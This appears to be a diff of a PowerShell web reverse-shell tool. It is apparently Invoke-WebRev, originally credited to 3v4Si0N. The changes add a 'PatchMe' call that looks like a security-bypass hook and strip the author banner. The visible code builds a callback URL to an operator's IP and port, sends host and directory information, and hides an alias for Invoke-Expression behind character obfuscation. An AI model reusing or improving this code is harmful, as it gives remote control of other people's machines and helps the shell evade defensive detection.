@@ -33,6 +33,7 @@ function Invoke-WebRev{
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     
     [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
+    
 
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
@@ -48,8 +49,9 @@ function Invoke-WebRev{
 
     try { $error[0] = ""; } catch {}
 
-    $previous_functions = (ls function:).Name
-    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
+    PatchMe;
+    $previous_functions = (ls function:).Name;
+    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );
 
     while ($true)
     {
@@ -184,10 +186,7 @@ function getPwd()
 
 function Get-ImportedFunctions
 {
-    $menu = @"
-
-         By: 3v4Si0N
-"@
+    $menu = ""
 
     if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
         $current_functions = (ls function:).Name
